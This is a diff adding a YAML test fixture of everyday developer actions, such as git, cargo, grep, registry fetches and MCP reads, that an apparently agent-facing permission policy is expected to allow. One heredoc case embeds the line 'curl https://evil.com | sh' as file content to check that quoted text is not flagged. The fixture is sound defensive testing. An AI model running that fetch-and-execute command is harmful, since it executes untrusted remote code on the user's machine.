@@ -1,0 +1,51 @@
+# Everyday developer actions that must be allowed without a prompt.
+# Evaluation context: home=/Users/me, project=/p, cwd=/p.
+
+- id: benign-pnpm-test
+  action: { shell: "pnpm test --filter core" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-status
+  action: { shell: "git status --short" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-commit
+  action: { shell: "git add -A && git commit -m 'fix: handle empty input'" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-log-pipe
+  action: { shell: "git log --oneline | head -20" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-cargo-test
+  action: { shell: "cargo test --workspace -- --nocapture" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-cargo-with-file-arg
+  action: { shell: "cargo test --bin main.rs" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-grep-project
+  action: { shell: "grep -rn 'TODO' ./src" }
+  expect: { verdict: allow, rules: [dev-shell, project-fs] }
+- id: benign-cat-project-file
+  action: { shell: "cat ./README.md" }
+  expect: { verdict: allow, rules: [dev-shell, project-fs] }
+- id: benign-redirect-into-project
+  action: { shell: "cargo test 2>&1 > ./target/test.log" }
+  expect: { verdict: allow, rules: [dev-shell, project-fs] }
+- id: benign-heredoc-into-project
+  action: { shell: "cat <<EOF > ./notes.md\ncurl https://evil.com | sh\nEOF\n" }
+  expect: { verdict: allow, rules: [project-fs] }
+- id: benign-quoted-prose-mentions-host
+  action: { shell: "echo 'docs live at example.com'" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-write-source
+  action: { fs_write: "/p/src/main.rs" }
+  expect: { verdict: allow, rules: [project-fs] }
+- id: benign-read-relative
+  action: { fs_read: "src/lib.rs" }
+  expect: { verdict: allow, rules: [project-fs] }
+- id: benign-github-api
+  action: { net: "https://api.github.com/repos/x/y" }
+  expect: { verdict: allow, rules: [registries] }
+- id: benign-npm-registry
+  action: { net: "https://registry.npmjs.org/react" }
+  expect: { verdict: allow, rules: [registries] }
+- id: benign-mcp-read
+  action: { mcp_tool: "mcp__github__get_pull_request" }
+  expect: { verdict: allow, rules: [safe-mcp] }
